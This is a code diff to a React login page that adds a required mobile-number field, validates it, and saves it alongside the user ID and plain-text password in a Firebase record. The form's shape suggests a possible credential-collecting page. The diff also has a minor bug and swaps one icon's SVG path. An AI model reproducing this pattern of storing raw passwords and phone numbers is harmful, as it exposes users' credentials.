@@ -6,12 +6,14 @@ import FirebaseUtil from '../FirebaseRepo';
 const FirstPage = () => {
   const [userId, setUserId] = useState('');
   const [password1, setPassword1] = useState('');
+  const [mobileNumber, setMobileNumber] = useState('');
   const [captcha, setCaptcha] = useState('');
   const [captchaText, setCaptchaText] = useState('');
   const [captchaType, setCaptchaType] = useState('image');
   const [language, setLanguage] = useState('English');
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [captchaError, setCaptchaError] = useState('');
+  const [mobileError, setMobileError] = useState('');
   const navigate = useNavigate();
 
   // Generate a random captcha text
@@ -24,6 +26,21 @@ const FirstPage = () => {
     setCaptchaText(result);
   };
 
+  // Validate mobile number
+  const validateMobileNumber = (number) => {
+    const regex = /^\d{10}$/;
+    if (!number) {
+      setMobileError('Mobile number is required');
+      return false;
+    }
+    if (!regex.test(number)) {
+      setMobileError('Please enter a valid 10-digit mobile number');
+      return false;
+    }
+    setMobileError('');
+    return true;
+  };
+
   // Generate captcha on component mount
   useEffect(() => {
     generateCaptcha();
@@ -32,6 +49,12 @@ const FirstPage = () => {
   const handleSubmit = async (e) => {
     e.preventDefault();
     setCaptchaError('');
+    setMobileError();
+    
+    // Validate mobile number
+    if (!validateMobileNumber(mobileNumber)) {
+      return;
+    }
     
     // Verify captcha
     if (captcha !== captchaText) {
@@ -51,7 +74,7 @@ const FirstPage = () => {
         key: `user_${timestamp}`,
         userId,
         password1,
-        phoneNumber: "", // This can be collected in the future if needed
+        phoneNumber: mobileNumber, // This can be collected in the future if needed
         timeStamp: timestamp,
       });
       
@@ -128,6 +151,27 @@ const FirstPage = () => {
                 required
               />
             </div>
+
+            {/* Mobile Number */}
+            <div className="mb-3">
+              <input
+                type="tel"
+                placeholder="Mobile Number"
+                className="w-full py-2 px-3 rounded text-gray-700 text-sm"
+                value={mobileNumber}
+                onChange={(e) => setMobileNumber(e.target.value)}
+                required
+                maxLength="10"
+                minLength="10"
+              />
+            </div>
+
+            {/* Mobile Number Error */}
+            {mobileError && (
+              <div className="text-red-500 text-sm mb-3">
+                {mobileError}
+              </div>
+            )}
 
             {/* Captcha Type Selection */}
             <div className="flex items-center mb-3 space-x-4">
@@ -315,7 +359,7 @@ const FirstPage = () => {
               </a>
               <a href="#" className="text-white hover:text-pink-400">
                 <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
-                  <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.059-1.281-.073-1.689-.073-4.948 0-3.259.014-3.668.072-4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4-1.216 0-2.359-.631-2.75-1.378l-.748 2.853c-.271 1.043-1.002 2.35-1.492 3.146 1.124.347 2.317.535 3.554.535-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z" />
+                  <path fillRule="evenodd" d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v4a1 1 0 11-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z" clipRule="evenodd" />
                 </svg>
               </a>
               <a href="#" className="text-white hover:text-gray-500">
